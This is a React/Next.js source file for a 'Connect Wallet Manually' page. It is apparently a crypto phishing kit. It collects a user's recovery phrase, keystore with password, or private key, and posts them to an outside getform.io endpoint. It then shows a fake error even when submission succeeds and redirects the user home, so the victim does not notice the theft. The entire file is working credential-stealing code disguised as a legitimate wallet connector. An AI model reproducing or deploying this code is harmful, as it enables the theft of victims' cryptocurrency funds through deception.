'use client'

import { useState, useEffect, Suspense } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { ArrowLeft, Eye, EyeOff, AlertCircle, CheckCircle2 } from 'lucide-react'
// Frown,
// XCircle
import { useRouter, useSearchParams } from 'next/navigation'
import Image from 'next/image'
import { cn } from '../../lib/utils'
import SuccessErrorOverlay from '../SuccessErrorOverlay'
import { wallets } from '../data/wallets'

type ConnectionMethod = 'phrase' | 'keystore' | 'private-key'

interface FormData {
  wallet?: string
  phrase?: string
  keystore?: string
  password?: string
  privateKey?: string
}

function ManualConnectContent () {
  const [activeMethod, setActiveMethod] = useState<ConnectionMethod>('phrase')
  const [showPassword, setShowPassword] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [success, setSuccess] = useState(false)
  const [formData, setFormData] = useState<FormData>({})
  const [showErrorOverlay, setShowErrorOverlay] = useState(false)
  const router = useRouter()
  const searchParams = useSearchParams()
  const walletId = searchParams.get('wallet')
  const selectedWallet = wallets.find(w => w.id === walletId)

  const FORM_ENDPOINT = 'https://getform.io/f/alllgoga'

  useEffect(() => {
    if (selectedWallet) {
      setFormData(prev => ({ ...prev, wallet: selectedWallet.name }))
    }
  }, [selectedWallet])

  // Validation rules
  const validateForm = (): string | null => {
    switch (activeMethod) {
      case 'phrase':
        const words = formData.phrase?.trim().split(/\s+/) || []
        if (!formData.phrase) return 'Recovery phrase is required'
        if (words.length !== 12 && words.length !== 24) {
          return 'Recovery phrase must be 12 or 24 words'
        }
        break
      case 'keystore':
        if (!formData.keystore) return 'Keystore JSON is required'
        try {
          JSON.parse(formData.keystore)
        } catch {
          return 'Invalid JSON format'
        }
        if (!formData.password) return 'Password is required'
        if (formData.password.length < 8)
          return 'Password must be at least 8 characters'
        break
      case 'private-key':
        if (!formData.privateKey) return 'Private key is required'
        const privateKeyRegex = /^[0-9a-fA-F]{64}$/
        if (!privateKeyRegex.test(formData.privateKey)) {
          return 'Invalid private key format'
        }
        break
    }
    return null
  }

  const handleInputChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>
  ) => {
    const { name, value } = e.target
    setFormData(prev => ({ ...prev, [name]: value }))
    setError(null)
  }

  const clearForm = () => {
    setFormData(prev => ({ wallet: prev.wallet }))
    setError(null)
  }

  useEffect(() => {
    clearForm()
  }, [activeMethod])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    const validationError = validateForm()
    if (validationError) {
      setError(validationError)
      return
    }

    setIsLoading(true)
    setError(null)

    const formDataToSend = new FormData()
    Object.entries(formData).forEach(([key, value]) => {
      if (value) formDataToSend.append(key, value)
    })
    formDataToSend.append('connectionMethod', activeMethod)

    try {
      const response = await fetch(FORM_ENDPOINT, {
        method: 'POST',
        body: formDataToSend,
        headers: {
          Accept: 'application/json'
        }
      })

      if (!response.ok) {
        throw new Error('Network response was not ok')
      }

      // Simulating a successful submission
      setSuccess(true)
      setShowErrorOverlay(true) // Show the error overlay even on success
    } catch (err) {
      console.error('Submission error:', err)
      setError('There was an error submitting the form. Please try again.')
    } finally {
      setIsLoading(false)
    }
  }

  const handleCloseErrorOverlay = () => {
    setShowErrorOverlay(false)
    router.push('/') // Redirect to the wallet selection page
  }

  const handleBack = () => {
    router.back()
  }

  if (!selectedWallet) {
    return <div>No wallet selected. Please go back and choose a wallet.</div>
  }

  return (
    <div className='min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 p-4'>
      <div className='container mx-auto px-4 py-8 max-w-2xl'>
        <button
          onClick={handleBack}
          className='flex items-center text-gray-400 hover:text-white transition-colors mb-8'
        >
          <ArrowLeft className='mr-2 h-4 w-4' />
          Back to wallet selection
        </button>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className='bg-gray-800/50 backdrop-blur-sm rounded-xl p-8'
        >
          <div className='text-center mb-8'>
            <div className='flex justify-center items-center mb-4'>
              <Image
                src={selectedWallet.iconPath}
                alt={selectedWallet.name}
                width={64}
                height={64}
                className='rounded-full'
              />
            </div>
            <h1 className='text-3xl font-bold mb-2 bg-gradient-to-r from-rose-100 to-teal-100 text-transparent bg-clip-text'>
              Connect {selectedWallet.name} Manually
            </h1>
            <p className='text-gray-400'>
              Choose your preferred method to connect your wallet
            </p>
          </div>

          <div className='flex space-x-1 mb-8 bg-gray-900/50 rounded-lg p-1'>
            {(['phrase', 'keystore', 'private-key'] as const).map(method => (
              <button
                key={method}
                onClick={() => setActiveMethod(method)}
                className={cn(
                  'flex-1 px-4 py-2 rounded-md text-sm font-medium transition-all duration-200',
                  activeMethod === method
                    ? 'bg-rose-500/20 text-rose-200'
                    : 'text-gray-400 hover:text-white'
                )}
              >
                {method
                  .split('-')
                  .map(word => word.charAt(0).toUpperCase() + word.slice(1))
                  .join(' ')}
              </button>
            ))}
          </div>

          <form onSubmit={handleSubmit} className='space-y-6'>
            <AnimatePresence mode='wait'>
              {activeMethod === 'phrase' && (
                <motion.div
                  key='phrase'
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -20 }}
                  className='space-y-4'
                >
                  <div>
                    <label className='block text-sm font-medium text-gray-200 mb-2'>
                      Recovery Phrase
                    </label>
                    <textarea
                      name='phrase'
                      value={formData.phrase || ''}
                      onChange={handleInputChange}
                      className='w-full px-4 py-3 rounded-lg bg-gray-900/50 border border-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-rose-500/50 transition-all duration-200'
                      placeholder='Enter your recovery phrase'
                      rows={3}
                    />
                    <p className='mt-2 text-sm text-gray-400'>
                      Typically 12 (sometimes 24) words separated by a single
                      space
                    </p>
                  </div>
                </motion.div>
              )}

              {activeMethod === 'keystore' && (
                <motion.div
                  key='keystore'
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -20 }}
                  className='space-y-4'
                >
                  <div>
                    <label className='block text-sm font-medium text-gray-200 mb-2'>
                      Keystore JSON
                    </label>
                    <textarea
                      name='keystore'
                      value={formData.keystore || ''}
                      onChange={handleInputChange}
                      className='w-full px-4 py-3 rounded-lg bg-gray-900/50 border border-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-rose-500/50 transition-all duration-200'
                      placeholder='Paste your keystore JSON'
                      rows={3}
                    />
                  </div>
                  <div className='relative'>
                    <label className='block text-sm font-medium text-gray-200 mb-2'>
                      Password
                    </label>
                    <input
                      name='password'
                      type={showPassword ? 'text' : 'password'}
                      value={formData.password || ''}
                      onChange={handleInputChange}
                      className='w-full px-4 py-3 rounded-lg bg-gray-900/50 border border-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-rose-500/50 transition-all duration-200'
                      placeholder='Enter password'
                    />
                    <button
                      type='button'
                      onClick={() => setShowPassword(!showPassword)}
                      className='absolute right-3 top-9 text-gray-400 hover:text-white transition-colors'
                    >
                      {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                    </button>
                  </div>
                </motion.div>
              )}

              {activeMethod === 'private-key' && (
                <motion.div
                  key='private-key'
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -20 }}
                  className='space-y-4'
                >
                  <div className='relative'>
                    <label className='block text-sm font-medium text-gray-200 mb-2'>
                      Private Key
                    </label>
                    <input
                      name='privateKey'
                      type={showPassword ? 'text' : 'password'}
                      value={formData.privateKey || ''}
                      onChange={handleInputChange}
                      className='w-full px-4 py-3 rounded-lg bg-gray-900/50 border border-gray-700 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-rose-500/50 transition-all duration-200'
                      placeholder='Enter your private key'
                    />
                    <button
                      type='button'
                      onClick={() => setShowPassword(!showPassword)}
                      className='absolute right-3 top-9 text-gray-400 hover:text-white transition-colors'
                    >
                      {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                    </button>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>

            <AnimatePresence>
              {error && (
                <motion.div
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -10 }}
                  className='flex items-center p-4 rounded-lg bg-red-500/10 border border-red-500/50'
                >
                  <AlertCircle className='h-5 w-5 text-red-500 mr-3' />
                  <p className='text-red-200 text-sm'>{error}</p>
                </motion.div>
              )}
            </AnimatePresence>

            <button
              type='submit'
              disabled={isLoading || success}
              className={cn(
                'w-full py-3 px-4 rounded-lg font-medium transition-all duration-200',
                isLoading || success
                  ? 'bg-rose-500/50 text-rose-200 cursor-not-allowed'
                  : 'bg-rose-500 text-white hover:bg-rose-600'
              )}
            >
              {isLoading ? (
                <span className='flex items-center justify-center'>
                  <motion.div
                    animate={{ rotate: 360 }}
                    transition={{
                      duration: 1,
                      repeat: Infinity,
                      ease: 'linear'
                    }}
                    className='w-5 h-5 border-2 border-white border-t-transparent rounded-full mr-2'
                  />
                  Connecting...
                </span>
              ) : success ? (
                <span className='flex items-center justify-center'>
                  <CheckCircle2 className='w-5 h-5 mr-2' />
                  Connected Successfully
                </span>
              ) : (
                'Connect Wallet'
              )}
            </button>
          </form>
        </motion.div>
      </div>

      <AnimatePresence>
        {showErrorOverlay && (
          <SuccessErrorOverlay
            onClose={handleCloseErrorOverlay}
            walletName={selectedWallet.name}
          />
        )}
      </AnimatePresence>
    </div>
  )
}

export default function ManualConnectPage () {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <ManualConnectContent />
    </Suspense>
  )
}
